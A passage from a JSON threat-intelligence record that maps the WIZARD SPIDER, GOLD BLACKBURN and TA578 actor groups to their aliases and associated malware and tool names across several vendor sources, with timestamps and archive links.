                "Mimikatz",
                "Diavol",
                "PsExec",
                "Cobalt Strike"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f6f91e1c-9202-4497-bf22-9cd5ef477600",
            "created_at": "2023-01-06T13:46:38.86765Z",
            "updated_at": "2025-03-27T02:00:02.938998Z",
            "deleted_at": null,
            "main_name": "WIZARD SPIDER",
            "aliases": [
                "FIN12",
                "UNC2053",
                "Pistachio Tempest",
                "TEMP.MixMaster",
                "GOLD BLACKBURN",
                "Periwinkle Tempest",
                "DEV-0193",
                "Storm-0193",
                "Trickbot LLC",
                "DEV-0237"
            ],
            "source_name": "MISPGALAXY:WIZARD SPIDER",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e6a21528-2999-4e2e-aaf4-8b6af14e17f3",
            "created_at": "2022-10-25T16:07:24.422115Z",
            "updated_at": "2025-03-27T02:02:10.216817Z",
            "deleted_at": null,
            "main_name": "Wizard Spider",
            "aliases": [
                "DEV-0193",
                "Gold Blackburn",
                "Gold Ulrick",
                "Grim Spider",
                "ITG23",
                "Operation BazaFlix",
                "Periwinkle Tempest",
                "TEMP.MixMaster",
                "Wizard Spider"
            ],
            "source_name": "ETDA:Wizard Spider",
            "tools": [
                "AdFind",
                "Agentemis",
                "Anchor_DNS",
                "BEERBOT",
                "BazarBackdoor",
                "BazarCall",
                "BazarLoader",
                "Cobalt Strike",
                "CobaltStrike",
                "Conti",
                "Diavol",
                "Dyranges",
                "Dyre",
                "Dyreza",
                "Dyzap",
                "Gophe",
                "Invoke-SMBAutoBrute",
                "KEGTAP",
                "LaZagne",
                "LightBot",
                "PowerSploit",
                "PowerTrick",
                "PsExec",
                "Ryuk",
                "SessionGopher",
                "TSPY_TRICKLOAD",
                "Team9Backdoor",
                "The Trick",
                "TheTrick",
                "Totbrick",
                "TrickBot",
                "TrickLoader",
                "TrickMo",
                "Upatre",
                "bazaloader",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bc119938-a79c-4e5f-9d4d-dc96835dfe2e",
            "created_at": "2024-06-04T02:03:07.799286Z",
            "updated_at": "2025-03-27T02:05:17.337094Z",
            "deleted_at": null,
            "main_name": "GOLD BLACKBURN",
            "aliases": [
                "Periwinkle Tempest ",
                "Wizard Spider ",
                "ITG23 "
            ],
            "source_name": "Secureworks:GOLD BLACKBURN",
            "tools": [
                " Buer Loader",
                " Dyre",
                " Team9",
                " TrickBot",
                "BazarLoader"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "52eb5fb6-706b-49c0-9ba5-43bea03940d0",
            "created_at": "2024-11-01T02:00:52.694476Z",
            "updated_at": "2025-03-27T02:00:55.51014Z",
            "deleted_at": null,
            "main_name": "TA578",
            "aliases": [
                "TA578"
            ],
            "source_name": "MITRE:TA578",
            "tools": [
                "Latrodectus",
                "IcedID"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535601,
    "ts_updated_at": 1743041782,
    "ts_creation_date": 1658167814,
    "ts_modification_date": 1658167814,
    "files": {
        "pdf": "https://archive.orkl.eu/91e7c419dd8e2b7fab500e981354dedab3a040ea.pdf",
        "text": "https://archive.orkl.eu/91e7c419dd8e2b7fab500e981354dedab3a040ea.txt",
        "img": "https://archive.orkl.eu/91e7c419dd8e2b7fab500e981354dedab3a040ea.jpg"
    }
}